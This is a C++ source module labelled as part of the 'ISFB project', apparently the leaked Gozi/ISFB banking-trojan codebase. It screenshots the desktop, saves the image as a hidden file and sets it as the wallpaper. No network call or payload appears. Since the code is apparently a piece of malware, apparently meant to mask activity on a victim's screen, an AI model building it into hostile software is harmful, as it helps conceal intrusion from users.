//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: desktop.cpp
// $Revision: 367 $
// $Date: 2014-10-07 17:26:07 +0400 (Вт, 07 окт 2014) $
// description:
//	Desktop wallaper manipulation routines

#include "common\main.h"
#include "common\memalloc.h"
#include "common\cschar.h"
#include "common\scrshot.h"


//
//	Sets the specified image file as current desktop wallpaper.
//
WINERROR SetWallpaperW(
	LPWSTR	pWallpaper
	)
{
	WINERROR Status;

	if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, pWallpaper, SPIF_UPDATEINIFILE))
		Status = NO_ERROR;
	else
		Status = GetLastError();
	
	return(Status);
}


//
//	Generates a screenshot of the desktop, saves it into the speciefied file and sets it as current desktop wallpaper.
//
WINERROR SetScrShotAsWallpaperW(
	LPWSTR	pScrShot,	// file path to save a screenshot to
	LPWSTR* ppWallpaper	// receives previouse wallpaper path
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	CLSID	imageCLSID = {0};
	LPWSTR	pWallpaper = NULL;

	do 
	{
		if (!(pWallpaper = (LPWSTR)AppAlloc(MAX_PATH * sizeof(WCHAR))))
			break;

		if (!SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, pWallpaper, 0))
			break;

		if ((Status = ScrGetEncoderClsid(wczImageBmp, &imageCLSID)) != NO_ERROR)
			break;

		if ((Status = ScrMakeScreenshot(GetShellWindow(), pScrShot, NULL, &imageCLSID)) != NO_ERROR)
			break;

		SetFileAttributesW(pScrShot, FILE_ATTRIBUTE_HIDDEN);

		Status = SetWallpaperW(pScrShot);

	} while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (Status != NO_ERROR)
	{
		if (pWallpaper)
			AppFree((PVOID)pWallpaper);
		DeleteFileW(pScrShot);
	}
	else
		*ppWallpaper = pWallpaper;

	return(Status);
}


